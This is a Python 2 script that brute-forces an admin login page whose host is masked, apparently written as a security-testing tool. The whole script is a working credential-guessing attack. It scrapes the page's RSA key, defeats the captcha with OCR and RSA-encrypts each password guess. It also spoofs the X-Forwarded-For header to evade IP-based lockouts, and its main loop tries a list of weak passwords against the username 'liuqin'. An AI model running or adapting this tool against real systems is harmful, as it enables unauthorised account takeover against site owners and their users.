#! -*- coding:utf-8 -*-
__author__="浮萍"
__Date__="20170622"

import rsa
import requests
import binascii
import base64
import json
import time
from urllib import urlencode
import re
import pytesseract
from PIL import Image

class AdminLogin:
    def __init__(self,username,pwd):
        self.modulus = None
        self.exponent = 'AQAB'
        self.mssc_sid = None
        self.token = None
        self.JSESSIONID = None
        self.username = username
        self.pwd = pwd
        self.captchaId = None
        self.captcha = None
        
    def getData(self):
        headers = {
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
            'Referer':'http://******/login.jsp',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For':str(int(time.time()))
        }       	
        url = 'http://******/login.jsp'
        res = requests.get(url,headers=headers)  
        captchaId = re.findall('captchaId=(.*?)&timestamp=',res.text)
        modulus = re.findall('b64tohex\(\"(.*?)\"\), b64tohex',res.text)
        self.JSESSIONID = res.cookies['JSESSIONID']
        self.modulus = modulus[0] 
        self.captchaId = captchaId[0]
        
    def readCaptcha(self):#验证码识别


        headers = {
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
            'Referer':'http://******/login.jsp',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For':self.captchaId
        }       	
        url = 'http://******/common/captcha.jhtml?captchaId='+self.captchaId
        try:	
            res = requests.get(url,headers=headers)  
        except requests.exceptions.ConnectionError:
            print '图片下载失败'

        path = "i:/img/"+self.captchaId+".png"
        fp = open(path,'wb')
        fp.write(res.content)
        fp.close()
        image = Image.open(path)
        code = pytesseract.image_to_string(image)
        self.captcha = code
        #print code
        
    def login(self):#登录
        cookie = {
            'JSESSIONID':self.JSESSIONID,
        }

        headers = {
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
            'Referer':'http://******/login.jsp',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For':self.username+self.pwd
        }        
        url = 'http://******/login.jsp'
        enPass = self.enPass()
        data = {
            'enPassword':enPass,
            'username':self.username,
            'captchaId':self.captchaId,
            'captcha': self.captcha
        }
        res = requests.post(url,cookies=cookie,data=data,headers=headers)   
        #result = json.loads(res.text)
        result = re.findall('message\(\"error\"\, \"(.*?)\"\);',res.text)
        #print res.text
        print '['+self.username+','+self.pwd+']'+result[0]

    def b64tohex(self,param):
        return binascii.b2a_hex(base64.b64decode(param))
    def hex2b64(self,param):
        return base64.b64encode(bytes(bytearray.fromhex(param)))
    def enPass(self):
        exponent = self.b64tohex(self.exponent)
        modulus = self.b64tohex(self.modulus)
        rsaKey = rsa.PublicKey(int(modulus, 16), int(exponent,16))

        enPwd = binascii.b2a_hex(rsa.encrypt(self.pwd, rsaKey))
        return self.hex2b64(enPwd)

if __name__ == '__main__':
    username = 'liuqin'
    
    pwds=['123456','123456aa','liuqin123','123456789']

    
    for pwd in pwds:
        print pwd
        adminLogin = AdminLogin(username, pwd.strip('\n'))
        adminLogin.getData()
        adminLogin.readCaptcha()    
        adminLogin.login()